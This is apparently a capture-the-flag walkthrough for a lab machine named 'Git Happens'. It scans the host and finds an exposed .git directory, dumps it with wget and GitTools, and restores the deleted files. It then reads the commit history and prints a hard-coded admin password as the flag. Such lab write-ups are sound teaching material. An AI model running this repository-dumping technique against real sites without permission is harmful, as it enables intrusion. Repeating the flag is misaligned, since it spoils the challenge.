# Git Happens

---

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
/.git/HEAD            (Status: 200) [Size: 23]
/.git                 (Status: 301) [Size: 194] [--> http://10.10.104.166/.git/]
/css                  (Status: 301) [Size: 194] [--> http://10.10.104.166/css/]
/index.html           (Status: 200) [Size: 6890]
```

## Download with wget

`wget --mirror -I .git http://10.10.104.166/.git`

`drwxr-xr-x 1 root root   8 Sep 21 04:35 10.10.104.166`

## gitTools (https://github.com/internetwache/GitTools)

`./gitdumper.sh http://10.10.104.166/.git/ output git`

`drwxr-xr-x 1 root root    8 Sep 21 04:33 output`


`git status`

```
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    .gitlab-ci.yml
        deleted:    Dockerfile
        deleted:    README.md
        deleted:    css/style.css
        deleted:    dashboard.html
        deleted:    default.conf
        deleted:    index.html

no changes added to commit (use "git add" and/or "git commit -a")

```

`git checkout -- .`
or
`git restore .`

```
┌──(root㉿core)-[/data/ctf/thm/git-happens/output]
└─# ls -la
total 28
drwxr-xr-x 1 root root  152 Sep 21 04:41 .
drwxr-xr-x 1 root root   50 Sep 21 04:40 ..
drwxr-xr-x 1 root root  112 Sep 21 04:41 .git
-rw-r--r-- 1 root root  792 Sep 21 04:41 .gitlab-ci.yml
-rw-r--r-- 1 root root  120 Sep 21 04:41 Dockerfile
-rw-r--r-- 1 root root   54 Sep 21 04:41 README.md
drwxr-xr-x 1 root root   18 Sep 21 04:41 css
-rw-r--r-- 1 root root 3775 Sep 21 04:41 dashboard.html
-rw-r--r-- 1 root root 1115 Sep 21 04:41 default.conf
-rw-r--r-- 1 root root 6890 Sep 21 04:41 index.html
```

`git log`

```
┌──(root㉿core)-[/data/ctf/thm/git-happens/dest-dir]
└─# git log
commit d0b3578a628889f38c0affb1b75457146a4678e5 (HEAD -> master, tag: v1.0)
Author: Adam Bertrand <hydragyrum@gmail.com>
Date:   Thu Jul 23 22:22:16 2020 +0000

    Update .gitlab-ci.yml

commit 77aab78e2624ec9400f9ed3f43a6f0c942eeb82d
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Fri Jul 24 00:21:25 2020 +0200

    add gitlab-ci config to build docker file.

commit 2eb93ac3534155069a8ef59cb25b9c1971d5d199
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Fri Jul 24 00:08:38 2020 +0200

    setup dockerfile and setup defaults.

commit d6df4000639981d032f628af2b4d03b8eff31213
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:42:30 2020 +0200

    Make sure the css is standard-ish!

commit d954a99b96ff11c37a558a5d93ce52d0f3702a7d
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:41:12 2020 +0200

    re-obfuscating the code to be really secure!

commit bc8054d9d95854d278359a432b6d97c27e24061d
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:37:32 2020 +0200

    Security says obfuscation isn't enough.

    They want me to use something called 'SHA-512'

commit e56eaa8e29b589976f33d76bc58a0c4dfb9315b1
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:25:52 2020 +0200

    Obfuscated the source code.

    Hopefully security will be happy!

commit 395e087334d613d5e423cdf8f7be27196a360459
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:17:43 2020 +0200

    Made the login page, boss!

commit 2f423697bf81fe5956684f66fb6fc6596a1903cc
Author: Adam Bertrand <hydragyrum@gmail.com>
Date:   Mon Jul 20 20:46:28 2020 +0000

    Initial commit


```

`# git show 395e087334d613d5e423cdf8f7be27196a360459`

```
--SNIP--
diff --git a/index.html b/index.html
new file mode 100644
index 0000000..0e0de07
--- /dev/null
+++ b/index.html
@@ -0,0 +1,75 @@
--SNIP--
	<script>
--SNIP--
+          username === "admin" &&
+          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
+        ) {
--SNIP--
+    </script>
--SNIP--

```

>Find the Super Secret Password

`Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!`